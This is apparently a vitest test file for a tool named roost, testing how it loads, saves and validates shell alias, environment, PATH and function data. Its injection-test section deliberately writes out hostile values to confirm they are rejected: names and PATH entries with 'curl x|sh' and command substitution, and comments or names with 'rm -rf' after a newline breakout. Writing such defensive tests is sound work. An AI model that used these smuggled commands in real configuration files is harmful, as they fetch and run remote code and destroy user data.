import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import * as yaml from "js-yaml";
import {
  emptyEnvData,
  loadEnvData,
  saveEnvData,
  validateEnvData,
  ENV_SCHEMA_VERSION,
} from "./env-data.js";
import type { EnvData } from "@roost/shared";

let tmpDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "roost-env-data-test-"));
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

describe("emptyEnvData", () => {
  it("returns the current schema version and empty arrays", () => {
    const d = emptyEnvData();
    expect(d.schemaVersion).toBe(ENV_SCHEMA_VERSION);
    expect(d.aliases).toEqual([]);
    expect(d.env).toEqual([]);
    expect(d.path).toEqual([]);
    expect(d.functions).toEqual([]);
  });
});

describe("loadEnvData — missing file", () => {
  it("returns empty doc when env.yaml does not exist", () => {
    const d = loadEnvData(tmpDir);
    expect(d).toEqual(emptyEnvData());
  });
});

describe("round-trip save/load", () => {
  it("persists and restores full EnvData preserving order and optional comments", () => {
    const data: EnvData = {
      schemaVersion: ENV_SCHEMA_VERSION,
      aliases: [
        { kind: "alias", name: "ll", value: "ls -la", enabled: true, comment: "list" },
        { kind: "alias", name: "g", value: "git", enabled: false },
      ],
      env: [{ kind: "env", name: "EDITOR", value: "nvim", secret: false, enabled: true }],
      path: [{ kind: "path", value: "/opt/bin", position: "append", enabled: true }],
      functions: [{ kind: "function", name: "mkcd", body: "mkcd() { :; }", enabled: true }],
    };
    saveEnvData(tmpDir, data);
    expect(loadEnvData(tmpDir)).toEqual(data);
  });

  it("creates the roost/ directory if it does not exist", () => {
    const nested = path.join(tmpDir, "subrepo");
    saveEnvData(nested, emptyEnvData());
    expect(fs.existsSync(path.join(nested, "roost", "env.yaml"))).toBe(true);
  });
});

describe("validateEnvData — malformed", () => {
  function writeRaw(content: string): void {
    const dir = path.join(tmpDir, "roost");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, "env.yaml"), content, "utf8");
  }

  it("throws when schemaVersion is missing", () => {
    expect(() => validateEnvData({ aliases: [], env: [], path: [], functions: [] })).toThrow(/schemaVersion/);
  });

  it("throws when a top-level array is not an array", () => {
    writeRaw(yaml.dump({ schemaVersion: 1, aliases: "nope", env: [], path: [], functions: [] }));
    expect(() => loadEnvData(tmpDir)).toThrow(/aliases/);
  });

  it("throws when an env entry is missing a boolean secret", () => {
    expect(() =>
      validateEnvData({
        schemaVersion: 1,
        aliases: [],
        env: [{ kind: "env", name: "X", value: "y", enabled: true }],
        path: [],
        functions: [],
      }),
    ).toThrow(/secret/);
  });

  it("throws when a path entry has an invalid position", () => {
    expect(() =>
      validateEnvData({
        schemaVersion: 1,
        aliases: [],
        env: [],
        path: [{ kind: "path", value: "/x", position: "sideways", enabled: true }],
        functions: [],
      }),
    ).toThrow(/position/);
  });

  it("throws when the root is not an object", () => {
    expect(() => validateEnvData(["a", "b"])).toThrow();
  });
});

// ── hostile input: shell-injection chokepoint (C1/C2/C3) ───────────────────────
// validateEnvData is the SINGLE gate for both yaml-load (capture/apply) and
// PUT /api/env. Names/comments/PATH values that could break out of the generated
// `~/.config/roost/env.sh` (which the user's shell `source`s) MUST be rejected here.

describe("validateEnvData — C1 reject injectable names", () => {
  const base = { schemaVersion: 1, aliases: [], env: [], path: [], functions: [] };

  it("rejects an alias name that smuggles a command", () => {
    expect(() =>
      validateEnvData({
        ...base,
        aliases: [{ kind: "alias", name: "ll=1 && curl x|sh #", value: "ls", enabled: true }],
      }),
    ).toThrow(/name/i);
  });

  it("rejects an env name that smuggles a command", () => {
    expect(() =>
      validateEnvData({
        ...base,
        env: [{ kind: "env", name: 'X=1; rm -rf "$HOME"; Y', value: "v", secret: false, enabled: true }],
      }),
    ).toThrow(/name/i);
  });

  it("rejects a function name that smuggles a command", () => {
    expect(() =>
      validateEnvData({
        ...base,
        functions: [{ kind: "function", name: "f(){ curl x|sh; }; g", body: "g() { :; }", enabled: true }],
      }),
    ).toThrow(/name/i);
  });

  it("accepts a normal POSIX identifier name", () => {
    expect(() =>
      validateEnvData({
        ...base,
        aliases: [{ kind: "alias", name: "_ll2", value: "ls -la", enabled: true }],
        env: [{ kind: "env", name: "EDITOR", value: "nvim", secret: false, enabled: true }],
        functions: [{ kind: "function", name: "mkcd", body: "mkcd() { :; }", enabled: true }],
      }),
    ).not.toThrow();
  });
});

describe("validateEnvData — C2 reject newline in comments", () => {
  const base = { schemaVersion: 1, aliases: [], env: [], path: [], functions: [] };

  it("rejects an alias comment containing a newline breakout", () => {
    expect(() =>
      validateEnvData({
        ...base,
        aliases: [{ kind: "alias", name: "ll", value: "ls", enabled: true, comment: "x\nrm -rf ~ #" }],
      }),
    ).toThrow(/comment/i);
  });

  it("rejects an env comment containing a carriage-return newline", () => {
    expect(() =>
      validateEnvData({
        ...base,
        env: [{ kind: "env", name: "X", value: "y", secret: false, enabled: true, comment: "a\r\nevil" }],
      }),
    ).toThrow(/comment/i);
  });

  it("accepts a single-line comment", () => {
    expect(() =>
      validateEnvData({
        ...base,
        aliases: [{ kind: "alias", name: "ll", value: "ls", enabled: true, comment: "list files" }],
      }),
    ).not.toThrow();
  });
});

describe("validateEnvData — C3 reject PATH value injection", () => {
  const base = { schemaVersion: 1, aliases: [], env: [], path: [], functions: [] };

  it("rejects a PATH value with command substitution", () => {
    expect(() =>
      validateEnvData({
        ...base,
        path: [{ kind: "path", value: "$(curl x|sh)", position: "prepend", enabled: true }],
      }),
    ).toThrow(/path/i);
  });

  it("rejects a PATH value that closes the quote and runs a command", () => {
    expect(() =>
      validateEnvData({
        ...base,
        path: [{ kind: "path", value: 'a":evil;"b', position: "append", enabled: true }],
      }),
    ).toThrow(/path/i);
  });

  it("accepts a PATH value referencing a shell variable", () => {
    expect(() =>
      validateEnvData({
        ...base,
        path: [
          { kind: "path", value: "$HOME/.local/bin", position: "prepend", enabled: true },
          { kind: "path", value: "${HOME}/bin", position: "append", enabled: true },
          { kind: "path", value: "~/go/bin", position: "append", enabled: true },
        ],
      }),
    ).not.toThrow();
  });
});
